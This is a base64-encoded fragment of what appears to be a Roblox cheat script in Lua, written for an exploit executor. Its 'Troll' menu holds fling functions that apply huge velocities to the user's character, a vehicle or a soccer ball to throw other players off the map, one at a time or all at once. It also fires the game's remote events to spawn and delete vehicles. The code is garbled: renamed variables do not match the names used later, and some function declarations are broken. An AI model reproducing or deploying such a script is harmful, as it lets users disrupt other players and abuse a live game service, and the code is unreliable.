gICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAtMS41LCAwKSwgQ0ZyYW1lLkFuZ2xlcygwLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAtMS41LCAwKSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZCgtOTApLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAtMS41LCAwKSwgQ0ZyYW1lLkFuZ2xlcygwLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIEJhc2VQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZSA+IDUwMCBvciBCYXNlUGFydC5QYXJlbnQgfj0gVGFyZ2V0UGxheWVyLkNoYXJhY3RlciBvciBUYXJnZXRQbGF5ZXIuUGFyZW50IH49IFBsYXllcnMgb3Igbm90IFRhcmdldFBsYXllci5DaGFyYWN0ZXIgPT0gVENoYXJhY3RlciBvciBUSHVtYW5vaWQuU2l0IG9yIEh1bWFub2lkLkhlYWx0aCA8PSAwIG9yIHRpY2soKSA+IFRpbWUgKyBUaW1lVG9XYWl0IG9yIGdldGdlbnYoKS5mbGluZ2xvb3AgPT0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgd29ya3NwYWNlLkZhbGxlblBhcnRzRGVzdHJveUhlaWdodCA9IDAvMAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl8wNHRuZ3UgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIpCiAgICAgICAgICAgICAgICAgICAgQlYuTmFtZSA9ICJTcGVlZERvUGFpIgogICAgICAgICAgICAgICAgICAgIEJWLlBhcmVudCA9IFJvb3RQYXJ0CiAgICAgICAgICAgICAgICAgICAgQlYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg5ZTgsIDllOCwgOWU4KQogICAgICAgICAgICAgICAgICAgIEJWLk1heEZvcmNlID0gVmVjdG9yMy5uZXcoMS8wLCAxLzAsIDEvMCkKICAgICAgICAgICAgICAgICAgICBIdW1hbm9pZDpTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIGZhbHNlKQoKICAgICAgICAgICAgICAgICAgICBpZiBUUm9vdFBhcnQgYW5kIFRIZWFkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFRSb290UGFydC5DRnJhbWUucCAtIFRIZWFkLkNGcmFtZS5wKS5NYWduaXR1ZGUgPiA1IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNGQmFzZVBhcnQoVEhlYWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNGQmFzZVBhcnQoVFJvb3RQYXJ0KQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgVFJvb3RQYXJ0IGFuZCBub3QgVEhlYWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBTRkJhc2VQYXJ0KFRSb290UGFydCkKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgbm90IFRSb290UGFydCBhbmQgVEhlYWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBTRkJhc2VQYXJ0KFRIZWFkKQogICAgICAgICAgICAgICAgICAgIGVsc2VpZiBub3QgVFJvb3RQYXJ0IGFuZCBub3QgVEhlYWQgYW5kIEFjY2Vzc29yeSBhbmQgSGFuZGxlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgU0ZCYXNlUGFydChIYW5kbGUpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgQlY6RGVzdHJveSgpCiAgICAgICAgICAgICAgICAgICAgSHVtYW5vaWQ6U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCB0cnVlKQogICAgICAgICAgICAgICAgICAgIHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3QgPSBIdW1hbm9pZAoKICAgICAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICAgICAgUm9vdFBhcnQuQ0ZyYW1lID0gZ2V0Z2VudigpLk9sZFBvcyAqIENGcmFtZS5uZXcoMCwgLjUsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIENoYXJhY3RlcjpTZXRQcmltYXJ5UGFydENGcmFtZShnZXRnZW52KCkuT2xkUG9zICogQ0ZyYW1lLm5ldygwLCAuNSwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgIEh1bWFub2lkOkNoYW5nZVN0YXRlKCJHZXR0aW5nVXAiKQogICAgICAgICAgICAgICAgICAgICAgICB0YWJsZS5mb3JlYWNoKENoYXJhY3RlcjpHZXRDaGlsZHJlbigpLCBmdW5jdGlvbihfLCB4KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgeDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHguVmVsb2NpdHksIHguUm90VmVsb2NpdHkgPSBWZWN0b3IzLm5ldygpLCBWZWN0b3IzLm5ldygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgIHVudGlsIChSb290UGFydC5Qb3NpdGlvbiAtIGdldGdlbnYoKS5PbGRQb3MucCkuTWFnbml0dWRlIDwgMjUKCiAgICAgICAgICAgICAgICAgICAgd29ya3NwYWNlLkZhbGxlblBhcnRzRGVzdHJveUhlaWdodCA9IGdldGdlbnYoKS5GUERICiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiBBbGxCb29sIHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCB4IGluIG5leHQsIFBsYXllcnM6R2V0UGxheWVycygpIGRvCiAgICAgICAgICAgICAgICAgICAgU2tpZEZsaW5nKHgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiB0YXJnZXRQbGF5ZXIgdGhlbgogICAgICAgICAgICAgICAgU2tpZEZsaW5nKHRhcmdldFBsYXllcikKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGVuZAoKICAgICAgICB3YWl0KCkKICAgICAgICBwY2FsbChmbGluZ2xvb3BmaXgpCiAgICBlbmQKZW5kCgpsb2NhbCB2YXJfemF5c3UzID0gVHJvbGw6QWRkU2VjdGlvbih7TmFtZSA9ICJGbGluZyBib2F0In0pCgpUcm9sbDpBZGRCdXR0b24oewogICAgTmFtZSA9ICJGbGluZyBib2F0IiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGlmIG5vdCBzZWxlY3RlZFBsYXllck5hbWUgb3Igbm90IGdhbWUuUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpIHRoZW4KICAgICAgICAgICAgbG9jYWwgdmFyXzFjZ3M3cCA9IEluc3RhbmNlLm5ldygnU291bmQnKQoKICAgICAgICBzLk5hbWUgPSAnU291bmQnCiAgICAgICAgcy5Tb3VuZElkID0gJ2h0dHA6Ly93d3cucm9ibG94LmNvbS9hc3NldC8/aWQ9MTA3OTc4NjA0NjA1MjY1JwogICAgICAgIHMuVm9sdW1lID0gMQogICAgICAgIHMuUGl0Y2ggPSAxCiAgICAgICAgcy5Mb29wZWQgPSBmYWxzZQogICAgICAgIHMuYXJjaGl2YWJsZSA9IGZhbHNlCgogICAgICAgIHMuUGFyZW50ID0gZ2FtZS5Xb3Jrc3BhY2UKCgogICAgICAgIHM6cGxheSgpCmdhbWUuU3RhcnRlckd1aTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewpUaXRsZSA9ICJFcnJvciIsClRleHQgPSAiUGxheWVyIG5vdCBzZWxlY3RlZCBvciBkb2VzIG5vdCBleGlzdC4iLApEdXJhdGlvbiA9IDQsCn0pCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCB2YXJfYTJodGRkID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgdmFyX2JzZXh1MiA9IFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBsb2NhbCB2YXJfMnkyMHh0ID0gQ2hhcmFjdGVyIGFuZCBDaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgbG9jYWwgdmFyXzgydnkwbSA9IENoYXJhY3RlciBhbmQgQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBsb2NhbCB2YXJfaDl5dnJyID0gZ2FtZS5Xb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIlZlaGljbGVzIikKCiAgICAgICAgaWYgbm90IEh1bWFub2lkIG9yIG5vdCBSb290UGFydCB0aGVuCiAgICAgICAgICAgIHdhcm4oIkludmFsaWQgSHVtYW5vaWQgb3IgUm9vdFBhcnQiKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgdmFyX2Z1Y2wzZCBzcGF3bkJvYXQoKQogICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDE3NTQsIC0yLCA1OCkKICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxQ2ExciIpOkZpcmVTZXJ2ZXIoIlBpY2tpbmdCb2F0IiwgIk1pbGl0YXJ5Qm9hdEZyZWUiKQogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgcmV0dXJuIFZlaGljbGVzOkZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lLi4iQ2FyIikKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgdmFyXzJnN2FiYyA9IFZlaGljbGVzOkZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lLi4iQ2FyIikgb3Igc3Bhd25Cb2F0KCkKICAgICAgICBpZiBub3QgUENhciB0aGVuCiAgICAgICAgICAgIHdhcm4oIkZhaWxlZCB0byBzcGF3biBib2F0IikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIHZhcl81aDZ2d2kgPSBQQ2FyOkZpbmRGaXJzdENoaWxkKCJCb2R5IikgYW5kIFBDYXIuQm9keTpGaW5kRmlyc3RDaGlsZCgiVmVoaWNsZVNlYXQiKQogICAgICAgIGlmIG5vdCBTZWF0IHRoZW4KICAgICAgICAgICAgd2FybigiU2VhdCBub3QgZm91bmQiKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgcmVwZWF0IAogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBTZWF0LkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgMSwgMCkKICAgICAgICB1bnRpbCBIdW1hbm9pZC5TZWF0UGFydCA9PSBTZWF0CgogICAgICAgIHByaW50KCJCb2F0IHNwYXduZWQhIikKCiAgICAgICAgbG9jYWwgdmFyX3hlZzBjeSA9IGdhbWUuUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpCiAgICAgICAgaWYgbm90IFRhcmdldFBsYXllciBvciBub3QgVGFyZ2V0UGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIHdhcm4oIlBsYXllciBub3QgZm91bmQiKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgdmFyXzYyMGVzbSA9IFRhcmdldFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBsb2NhbCB2YXJfaXlwYTJ2ID0gVGFyZ2V0QzpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICBsb2NhbCB2YXJfamVkZ2x1ID0gVGFyZ2V0QzpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCgogICAgICAgIGlmIG5vdCBUYXJnZXRSUCBvciBub3QgVGFyZ2V0SCB0aGVuCiAgICAgICAgICAgIHdhcm4oIlRhcmdldCdzIEh1bWFub2lkIG9yIFJvb3RQYXJ0IG5vdCBmb3VuZCIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCB2YXJfZ3RrczRkID0gSW5zdGFuY2UubmV3KCJCb2R5QW5ndWxhclZlbG9jaXR5IikKICAgICAgICBTcGluLk5hbWUgPSAiU3Bpbm5pbmciCiAgICAgICAgU3Bpbi5QYXJlbnQgPSBQQ2FyLlByaW1hcnlQYXJ0CiAgICAgICAgU3Bpbi5NYXhUb3JxdWUgPSBWZWN0b3IzLm5ldygwLCBtYXRoLmh1Z2UsIDApCiAgICAgICAgU3Bpbi5Bbmd1bGFyVmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg0NSwgNjc4OSwgOTQ4NSkgCgogICAgICAgIHByaW50KCJGbGluZyBhY3RpdmUhIikKCiAgICAgICAgbG9jYWwgdmFyX2R2OThoMCBtb3ZlQ2FyKFRhcmdldFJQLCBvZmZzZXQpCiAgICAgICAgICAgIGlmIFBDYXIgYW5kIFBDYXIuUHJpbWFyeVBhcnQgdGhlbgogICAgICAgICAgICAgICAgUENhcjpTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KFRhcmdldFJQLlBvc2l0aW9uICsgb2Zmc2V0KSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBQQ2FyIGFuZCBQQ2FyLlBhcmVudCBhbmQgVGFyZ2V0UlAgYW5kIFRhcmdldFJQLlBhcmVudCBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpIAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBtb3ZlQ2FyKFRhcmdldFJQLCBWZWN0b3IzLm5ldygwLCAxLCAwKSkgIAogICAgICAgICAgICAgICAgbW92ZUNhcihUYXJnZXRSUCwgVmVjdG9yMy5uZXcoMCwgLTIuMjUsIDUpKSAgCiAgICAgICAgICAgICAgICBtb3ZlQ2FyKFRhcmdldFJQLCBWZWN0b3IzLm5ldygwLCAyLjI1LCAwLjI1KSkgIAogICAgICAgICAgICAgICAgbW92ZUNhcihUYXJnZXRSUCwgVmVjdG9yMy5uZXcoLTIuMjUsIC0xLjUsIDIuMjUpKSAgCiAgICAgICAgICAgICAgICBtb3ZlQ2FyKFRhcmdldFJQLCBWZWN0b3IzLm5ldygwLCAxLjUsIDApKSAgCiAgICAgICAgICAgICAgICBtb3ZlQ2FyKFRhcmdldFJQLCBWZWN0b3IzLm5ldygwLCAtMS41LCAwKSkgIAoKICAgICAgICAgICAgICAgIGlmIFBDYXIgYW5kIFBDYXIuUHJpbWFyeVBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9rM3lldWsgPSBDRnJhbWUuQW5nbGVzKAogICAgICAgICAgICAgICAgICAgICAgICBtYXRoLnJhZChtYXRoLnJhbmRvbSgtMzY5LCAzNjkpKSwgIAogICAgICAgICAgICAgICAgICAgICAgICBtYXRoLnJhZChtYXRoLnJhbmRvbSgtMzY5LCAzNjkpKSwgCiAgICAgICAgICAgICAgICAgICAgICAgIG1hdGgucmFkKG1hdGgucmFuZG9tKC0zNjksIDM2OSkpCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgIFBDYXI6U2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldyhUYXJnZXRSUC5Qb3NpdGlvbiArIFZlY3RvcjMubmV3KDAsIDEuNSwgMCkpICogUm90YXRpb24pCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiBTcGluIGFuZCBTcGluLlBhcmVudCB0aGVuCiAgICAgICAgICAgICAgICBTcGluOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgcHJpbnQoIkZsaW5nIGRlYWN0aXZhdGVkIikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogIHRhc2sud2FpdCg1KQogICAgICAgIGxvY2FsIHZhcl8zeThhZDAgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCB2YXJfbDFlNHk5ID0gUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIHZhcl9jbmlnaGEgPSBDaGFyYWN0ZXIgYW5kIENoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgdmFyX2JpazdiYSA9IENoYXJhY3RlciBhbmQgQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgIGxvY2FsIHZhcl9jYThrcGcgPSBnYW1lLldvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiVmVoaWNsZXMiKQoKICAgICAgICBpZiBub3QgUm9vdFBhcnQgb3Igbm90IEh1bWFub2lkIHRoZW4KICAgICAgICAgICAgd2FybigiTm8gUm9vdFBhcnQgb3IgSHVtYW5vaWQgZm91bmQhIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIEh1bWFub2lkLlBsYXRmb3JtU3RhbmQgPSB0cnVlCiAgICAgICAgcHJpbnQoIlBsYXllciBmcm96ZW4gdG8gcmVkdWNlIHNwaW4gZWZmZWN0cy4iKQoKICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKFJvb3RQYXJ0OkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIG9iajpJc0EoIkJvZHlBbmd1bGFyVmVsb2NpdHkiKSBvciBvYmo6SXNBKCJCb2R5VmVsb2NpdHkiKSB0aGVuCiAgICAgICAgICAgICAgICBvYmo6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHByaW50KCJTcGluIGFuZCBmb3JjZXMgcmVtb3ZlZCBmcm9tIHBsYXllci4iKQoKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFDYTFyIik6RmlyZVNlcnZlcigiRGVsZXRlQWxsVmVoaWNsZXMiKQogICAgICAgIHRhc2sud2FpdCgwLjUpCgogICAgICAgIGxvY2FsIHZhcl9nY251NnUgPSBWZWhpY2xlcyBhbmQgVmVoaWNsZXM6RmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUuLiJDYXIiKQogICAgICAgIGlmIFBDYXIgYW5kIFBDYXIuUHJpbWFyeVBhcnQgdGhlbgogICAgICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKFBDYXIuUHJpbWFyeVBhcnQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgIGlmIG9iajpJc0EoIkJvZHlBbmd1bGFyVmVsb2NpdHkiKSBvciBvYmo6SXNBKCJCb2R5VmVsb2NpdHkiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgb2JqOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBwcmludCgiU3BpbiByZW1vdmVkIGZyb20gYm9hdC4iKQogICAgICAgIGVuZAoKICAgICAgICB0YXNrLndhaXQoMSkKCiAgICAgICAgbG9jYWwgdmFyXzV5MjNqciA9IFZlY3RvcjMubmV3KDAsIDEwMDAsIDApCiAgICAgICAgbG9jYWwgdmFyX205cWFxYiA9IEluc3RhbmNlLm5ldygiQm9keVBvc2l0aW9uIiwgUm9vdFBhcnQpCiAgICAgICAgYnAuUG9zaXRpb24gPSBzYWZlUG9zCiAgICAgICAgYnAuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsIG1hdGguaHVnZSwgbWF0aC5odWdlKQoKICAgICAgICBsb2NhbCB2YXJfazB0Zm9tID0gSW5zdGFuY2UubmV3KCJCb2R5R3lybyIsIFJvb3RQYXJ0KQogICAgICAgIGJnLkNGcmFtZSA9IFJvb3RQYXJ0LkNGcmFtZQogICAgICAgIGJnLk1heFRvcnF1ZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSwgbWF0aC5odWdlLCBtYXRoLmh1Z2UpCgogICAgICAgIHByaW50KCJQbGF5ZXIgaXMgbG9ja2VkIGF0IGEgc2FmZSBjb29yZGluYXRlLiIpCgogICAgICAgIHRhc2sud2FpdCgzKQoKICAgICAgICBicDpEZXN0cm95KCkKICAgICAgICBiZzpEZXN0cm95KCkKICAgICAgICBIdW1hbm9pZC5QbGF0Zm9ybVN0YW5kID0gZmFsc2UKcHJpbnQoIlZlbnNlIFNhZmU6IGluZG8gcGFyYSBvIGlu7WNpby4uIikKICAgIGVuZAp9KQoKVHJvbGw6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiQ2xpY2sgRmxpbmcgQmFsbCAoVG9vbCkiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvY2FsIHZhcl96amMxajQgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCB2YXJfeG92Y2YxID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCmxvY2FsIHZhcl9qaHYzc2IgPSBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpCmxvY2FsIHZhcl9sNmJ0aTUgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQpsb2NhbCB2YXJfMnk5dGY3ID0gd29ybGQuQ3VycmVudENhbWVyYQpsb2NhbCB2YXJfMWc0ZWltID0gcGxheWVycy5Mb2NhbFBsYXllcgoKbG9jYWwgdmFyXzFyMW50dyA9ICJDbGljayBGbGluZyBCYWxsIgpsb2NhbCB2YXJfMXUyYTB5ID0gZmFsc2UKCmxvY2FsIHZhcl94cmM5N3MgPSBsb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIkJhY2twYWNrIikKaWYgbm90IGJhY2twYWNrOkZpbmRGaXJzdENoaWxkKFRPT0xfTkFNRSkgdGhlbgoJbG9jYWwgdmFyX3FyZzd4bCA9IEluc3RhbmNlLm5ldygiVG9vbCIpCgl0b29sLk5hbWUgPSBUT09MX05BTUUKCXRvb2wuUmVxdWlyZXNIYW5kbGUgPSBmYWxzZQoJdG9vbC5DYW5CZURyb3BwZWQgPSBmYWxzZQoKCXRvb2wuRXF1aXBwZWQ6Q29ubmVjdChmdW5jdGlvbigpCgkJdG9vbEVxdWlwcGVkID0gdHJ1ZQoJZW5kKQoKCXRvb2wuVW5lcXVpcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKCQl0b29sRXF1aXBwZWQgPSBmYWxzZQoJZW5kKQoKCXRvb2wuUGFyZW50ID0gYmFja3BhY2sKZW5kCgotLSBGbGluZ0JhbGwgZnVuY3Rpb24gKGJhbGwpCmxvY2FsIHZhcl9oNDJ1ZzYgRmxpbmdCYWxsKHRhcmdldCkKICAgIAoKICAgIGxvY2FsIHZhcl8xY2gwZ2EgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgbG9jYWwgdmFyX2VrNzBtdCA9IHBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIHZhcl92eHUyOHQgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgIGxvY2FsIHZhcl9ueDZ2YWggPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpCiAgICBsb2NhbCB2YXJfd25lYXZrID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBsb2NhbCB2YXJfbHZjYjJoID0gcGxheWVyOldhaXRGb3JDaGlsZCgiQmFja3BhY2siKQogICAgbG9jYWwgdmFyXzdndnIzcCA9IHdvcmtzcGFjZS5Xb3Jrc3BhY2VDb206V2FpdEZvckNoaWxkKCIwMDFfU29jY2VyQmFsbHMiKQoKICAgIGxvY2FsIHZhcl8ydDZqMm8gR2V0QmFsbCgpCiAgICAgICAgaWYgbm90IGJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJTb2NjZXJCYWxsIikgYW5kIG5vdCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlNvY2NlckJhbGwiKSB0aGVuCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIik6SW52b2tlU2VydmVyKCJQaWNraW5nVG9vbHMiLCAiU29jY2VyQmFsbCIpCiAgICAgICAgZW5kCgogICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBiYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiU29jY2VyQmFsbCIpIG9yIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiU29jY2VyQmFsbCIpCgogICAgICAgIGxvY2FsIHZhcl8xdHJwNWwgPSBiYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiU29jY2VyQmFsbCIpCiAgICAgICAgaWYgYmFsbFRvb2wgdGhlbgogICAgICAgICAgICBiYWxsVG9vbC5QYXJlbnQgPSBjaGFyYWN0ZXIKICAgICAgICBlbmQKCiAgICAgICAgcmVwZWF0IHRhc2sud2FpdCgpIHVudGlsIFNlcnZlckJhbGxzOkZpbmRGaXJzdENoaWxkKCJTb2NjZXIiIC4uIHBsYXllci5OYW1lKQoKICAgICAgICByZXR1cm4gU2VydmVyQmFsbHM6RmluZEZpcnN0Q2hpbGQoIlNvY2NlciIgLi4gcGxheWVyLk5hbWUpCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfMHZkYzNjID0gU2VydmVyQmFsbHM6RmluZEZpcnN0Q2hpbGQoIlNvY2NlciIgLi4gcGxheWVyLk5hbWUpIG9yIEdldEJhbGwoKQogICAgQmFsbC5DYW5Db2xsaWRlID0gZmFsc2UKICAgIEJhbGwuTWFzc2xlc3MgPSB0cnVlCiAgICBCYWxsLkN1c3RvbVBoeXNpY2FsUHJvcGVydGllcyA9IFBoeXNpY2FsUHJvcGVydGllcy5uZXcoMC4wMDAxLCAwLCAwKQoKICAgIGlmIHRhcmdldCB+PSBwbGF5ZXIgdGhlbgogICAgICAgIGxvY2FsIHZhcl9jOXJla3QgPSB0YXJnZXQuQ2hhcmFjdGVyCiAgICAgICAgaWYgdGNoYXIgYW5kIHRjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgYW5kIHRjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4KICAgICAgICAgICAgbG9jYWwgdmFyX3dmaTJ2ayA9IHRjaGFyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgbG9jYWwgdmFyX29ydzA2MyA9IHRjaGFyLkh1bWFub2lkCgogICAgICAgICAgICBpZiBCYWxsOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkJvZHlWZWxvY2l0eSIpIHRoZW4KICAgICAgICAgICAgICAgIEJhbGw6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiQm9keVZlbG9jaXR5Iik6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgbG9jYWwgdmFyX2R3MmNnYSA9IEluc3RhbmNlLm5ldygiQm9keVZlbG9jaXR5IikKICAgICAgICAgICAgYnYuTmFtZSA9ICJGbGluZ1Bvd2VyIgogICAgICAgICAgICBidi5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDllOCwgOWU4LCA5ZTgpCiAgICAgICAgICAgIGJ2Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgICAgICAgICAgYnYu